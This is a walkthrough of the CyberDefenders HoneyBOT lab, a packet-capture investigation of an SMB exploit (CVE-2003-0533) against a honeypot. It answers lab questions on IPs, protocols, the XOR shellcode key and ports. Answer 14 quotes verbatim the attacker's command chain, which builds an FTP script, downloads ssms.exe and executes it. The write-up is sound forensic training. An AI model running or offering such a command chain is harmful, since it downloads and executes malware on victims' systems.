# Challenge Report for HoneyBOT

- **Challenge Name: HoneyBOT**
- **Date: Done before I started documenting.**
- **URL: <https://cyberdefenders.org/labs/45>**
- **Status: Complete**

***

## Description

A PCAP analysis exercise highlighting attacker's interactions with honeypots and how automatic exploitation works.. (Note that the IP address of the victim has been changed to hide the true location.)

## Tools Used

- Wireshark
- Brim
- Cyberchef

## Analysis

1. What is the attacker's IP address?

    **98.114.205.102**

    ```text
    Found using BRIM and the Suricata Alert by Source and Destination.
    ```

2. What is the target's IP address?  

    **192.150.11.111**

    ```text
    Found using BRIM and the Suricata Alert by Source and Destination.
    ```

3. Provide the country code for the attacker's IP address (a.k.a geo-location).

    **US**

    ```text
    MXToolbox Arin lookup of the attackers IP.
    ```

4. How many TCP sessions are present in the captured traffic?

    **5**

    ```text
    Wireshark -> Convertsations -> TCP
    ```

5. How long did it take to perform the attack (in seconds)?

    **16**

    ```text
    BRIM overview & time maths
    ```

6. No 6?

7. Provide the CVE number of the exploited vulnerability.

    **CVE-2003-0533**

    ```text
    Wireshark shows DsRuleUpgradeDownlevelServer response.  Searching <https://www.cvedetails.com/> found it.
    ```

8. Which protocol was used to carry over the exploit?

    **smb**

    ```text
    Found in BRIM Overview
    ```

9. Which protocol did the attacker use to download additional malicious files to the target system?

    **ftp**

    ```text
    Found in BRIM Overview
    ```

10. What is the name of the downloaded malware?

    **ssms.exe**

    ```text
    Found in BRIM Overview
    ```

11. The attacker's server was listening on a specific port. Provide the port number.

    **8884**

    ```text
    Found in BRIM Overview
    ```

12. When was the involved malware first submitted to VirusTotal for analysis?

    **2007-06-27**

    ```text
    Grabbed FTP Stream in Wireshark and saved as file.  File is ssms.exe and Virustotal says; 2007-06-27
    ```

13. What is the key used to encode the shellcode?

    **0x99**

    ```text
    Found the attack in tcp stream 1. NOP sled followed by shellcode followed by another NOP sled.  Cut out the shellcode and used Cyberchef to convert to asm.
    ```

14. What is the port number the shellcode binds to?

    **1957**

    ```text
    TCP Stream 2 we can see "echo open 0.0.0.0 8884 > o&echo user 1 1 >> o &echo get ssms.exe >> o &echo quit >> o &ftp -n -s:o &del /F /Q o &ssms.exe" which happens on port 1957.
    ```

15. The shellcode used a specific technique to determine its location in memory. What is the OS file being queried during this process?

    **kernel32.dll**
